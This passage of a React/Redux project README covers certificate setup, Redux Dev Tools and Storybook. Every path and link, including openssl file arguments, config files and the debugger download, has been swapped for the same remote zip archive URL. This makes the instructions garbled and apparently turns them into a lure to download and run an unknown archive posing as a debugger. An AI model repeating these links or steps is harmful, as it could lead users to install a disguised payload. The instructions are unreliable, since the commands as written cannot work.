...
- To convert .crt to .der, run: `openssl x509 -in https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/locales/de/service_catalog_product_3.7.zip -out https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/locales/de/service_catalog_product_3.7.zip -outform DER`

Then open `https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/locales/de/service_catalog_product_3.7.zip` and add your local IP to the domain-config and your cert to the trust-anchors (without the file extension).

For example if your local IP is `123.0.0.7` and your cert is in `https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/locales/de/service_catalog_product_3.7.zip`: 
...
### Redux Dev Tools
This project uses `react-redux` https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/locales/de/service_catalog_product_3.7.zip for state management. To take advantage of the tooling available, go to https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/locales/de/service_catalog_product_3.7.zip and install the debugger.
...
### Storybook
1. In `https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/locales/de/service_catalog_product_3.7.zip` change `APP_LOAD_STORY_BOOK=false` to `APP_LOAD_STORY_BOOK=true`
...
1. Open `https://raw.githubusercontent.com/abhijitssanghvi/product-catalog-service/revert-513-fix/contactName/locales/de/service_catalog_product_3.7.zip`
